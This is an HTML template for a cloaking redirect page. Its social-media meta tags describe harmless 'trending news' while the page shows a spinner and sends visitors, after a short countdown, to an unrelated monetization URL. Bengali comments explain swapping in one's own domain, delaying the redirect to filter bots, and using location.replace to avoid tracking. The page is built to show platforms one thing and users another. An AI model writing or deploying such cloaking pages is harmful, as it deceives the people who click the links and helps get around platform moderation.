<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trending News & Entertainment Update</title>
	
    <!-- Optimized Meta Tags for Social Media (Safe Content) -->
    <meta name="description" content="Stay updated with the latest trends, lifestyle tips, and exclusive entertainment news from around the world.">
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Latest Updates, Entertainment News & Digital Trends">
    <meta property="og:description" content="Stay updated with the latest trends, lifestyle tips, and exclusive entertainment news from around the world.">
    <!-- Note: এখানে আপনার নিজের ল্যান্ডিং পেজের ডোমেইন ইউআরএল বসাবেন, অন্য সাইটের নয় -->
    <meta property="og:url" content="https://yourdomain.com/"> 
    <meta property="og:site_name" content="TrendPulse News">
    <meta property="og:image" content="https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=600&auto=format&fit=crop&q=60">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Latest Updates, Entertainment News & Digital Trends">
    <meta name="twitter:description" content="Stay updated with the latest trends, lifestyle tips, and exclusive entertainment news from around the world.">

    <style>
        * {
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f7f9fa;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        .container {
            max-width: 450px;
            width: 90%;
            background: #ffffff;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
            text-align: center;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1a1a1a;
        }
        .sub-message {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
        }
        .countdown {
            font-size: 16px;
            color: #007bff;
            font-weight: bold;
            background: #e6f2ff;
            display: inline-block;
            padding: 6px 16px;
            border-radius: 20px;
        }
    </style>
</head>
<body>

  <div class="container">
      <div class="spinner"></div>
      <div class="message">Please wait...</div>
      <div class="sub-message">Please wait while we safely redirect your request.</div>
      <div class="countdown">Redirecting in <span id="countdown">3</span>s</div>
  </div>

  <script>
    // উইন্ডো পুরোপুরি লোড হওয়ার পর টাইমার চালু হবে (বট ফিল্টারিংয়ের জন্য সাহায্য করে)
    window.addEventListener('load', () => {
        let count = 3;
        const countdownElement = document.getElementById("countdown");
        const targetUrl = "https://applyavailablebecoming.com/nkmzu75hi?key=7e0a7c08b50bd1c13eec0830918bbd21";

        const timer = setInterval(() => {
            count--;
            if (count <= 0) {
                clearInterval(timer);
                // মেটা রিফ্রেশ বা ডিরেক্ট উইন্ডো লোকেশন ট্র্যাকিং এড়াতে 'replace' ব্যবহার করা ভালো
                window.location.replace(targetUrl);
            } else {
                countdownElement.textContent = count;
            }
        }, 1000);
    });
  </script>
</body>
</html>
